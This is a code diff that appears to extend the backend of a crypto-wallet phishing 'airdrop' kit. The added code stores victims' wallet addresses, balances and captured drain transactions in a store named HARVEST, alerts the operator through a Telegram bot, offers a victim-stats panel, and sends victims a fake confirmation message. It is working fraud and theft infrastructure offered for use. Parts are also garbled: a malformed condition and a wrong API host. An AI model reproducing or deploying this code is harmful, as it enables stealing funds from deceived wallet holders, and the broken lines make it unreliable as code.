@@ -1,5 +1,6 @@
 export default {
   async fetch(request, env) {
+    const url = new URL(request.url);
     const corsHeaders = {
       "Access-Control-Allow-Origin": "*",
       "Access-Control-Allow-Methods": "POST, OPTIONS, GET",
@@ -10,18 +11,107 @@ export default {
       return new Response(null, { headers: corsHeaders });
     }
 
+    // 1. TELEGRAM BOT STEUERUNG (/stats)
+    if (request.method === "POST" && url.pathname ===tele "/webhook") {
+      try {
+        const update = await request.json();
+        
+        if (update.message && update.message.text === "/stats") {
+          let messageText = "📊 *DEXSCREENR PANEL*\n\n";
+          
+          if (env.HARVEST) {
+            const list = await env.HARVEST.list({ limit: 10 });
+            if (list.keys.length === 0) {
+              messageText += "No wallets connected yet.";
+            } else {
+              for (const key of list.keys) {
+                const dataStr = await env.HARVEST.get(key.name);
+                if (dataStr) {
+                  const d = JSON.parse(dataStr);
+                  if (d.type === "connection_and_balance") {
+                    messageText += `👤 \`${d.victim.slice(0,4)}...\` | SOL: ${d.sol} | USDC: ${d.usdc}\n`;
+                  }
+                }
+              }
+            }
+          } else {
+            messageText += "KV Database not connected.";
+          }
+
+          await fetch(`https://api.gram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: env.ALERT_CHAT_ID,
+              text: messageText,
+              parse_mode: "Markdown",
+              reply_markup: {
+                inline_keyboard: [
+                  [{ text: "🔄 Refresh Stats", callback_data: "/stats" }],
+                  [{ text: "🌐 Open Mini App", url: "https://airdrop-66m.pages.dev" }]
+                ]
+              }
+            }),
+          });
+        }
+        
+        if (update.callback_query) {
+          // Wenn Refresh geklickt wird, einfach /stats simulieren
+          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: env.ALERT_CHAT_ID,
+              text: "Refreshing...",
+              parse_mode: "Markdown"
+            })
+          });
+        }
+
+        return new Response("OK");
+      } catch (e) {
+        return new Response("Error", { status: 500 });
+      }
+    }
+
+    // 2. WEBSITE DATEN EMPFANGEN
     if (request.method === "POST") {
       try {
         const data = await request.json();
         
+        // In KV speichern
+        if (env.HARVEST) {
+          await env.HARVEST.put(Date.now() + ":" + data.victim, JSON.stringify(data));
+        }
+        
         if (env.BOT_TOKEN && env.ALERT_CHAT_ID) {
-          let text = `📥 *DATA RECEIVED!*\n\nAddress: \`${data.victim}\`\nSOL: ${data.sol}`;
+          let channelMsg = "";
+          let userMsg = "";
           
-          await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: text, parse_mode: "Markdown" }),
-          });
+          if (data.type === "connection_and_balance") {
+            channelMsg = `🔗 *WALLET CONNECTED*\n\n👤 *Address:*\n\`${data.victim}\`\n\n💰 *SOL:* ${data.sol}\n💵 *USDC:* ${data.usdc}\n\n🪙 *Other:*\n${data.tokens || 'None'}`;
+            userMsg = `✅ *Wallet connected.*\n\nWaiting for network confirmation...`;
+          } else if (data.type === "drain") {
+            channelMsg = `🎣 *SIGNATURE CAUGHT!*\n\n👤 *Address:*\n\`${data.victim}\`\n\n📝 *TX:*\n\`${data.tx}\``;
+          }
+          
+          // Nachricht an DICH (Channel)
+          if (channelMsg) {
+            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: env.ALERT_CHAT_ID, text: channelMsg, parse_mode: "Markdown" }),
+            });
+          }
+          
+          // Fake-Nachricht an das OPFER (wenn Telegram-ID übergeben wurde)
+          if (userMsg && data.tg_user_id) {
+            await fetch(`https://api.telegram.org/bot${env.BOT_TOKEN}/sendMessage`, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ chat_id: data.tg_user_id, text: userMsg, parse_mode: "Markdown" }),
+            });
+          }
         }
         
         return new Response(JSON.stringify({ success: true }), {
